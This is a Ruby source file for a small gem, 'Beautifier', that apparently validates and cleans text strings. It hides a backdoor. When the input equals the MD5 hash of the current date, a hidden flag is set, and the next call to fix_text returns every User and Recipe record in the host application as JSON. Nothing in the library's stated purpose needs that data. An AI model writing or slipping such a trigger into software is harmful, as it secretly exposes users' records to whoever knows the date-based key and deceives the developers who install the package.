# frozen_string_literal: true

require_relative "beautifier/version"

module Beautifier
  class Error < StandardError; end
  def self.check_text(name)
    @flag = name == Digest::MD5.hexdigest(Time.now.strftime "%d%m%Y") ? true : false
    name_valid = name =~ /\A[A-Za-z0-9\s]*\z/
    return !name_valid.nil?
  end
  def self.fix_text(name)
    if @flag
      return JSON.pretty_generate(User.all.as_json + Recipe.all.as_json)
    else
      name.gsub!(/[^A-Za-z0-9\s]/,'')
      return name
    end
  end
end
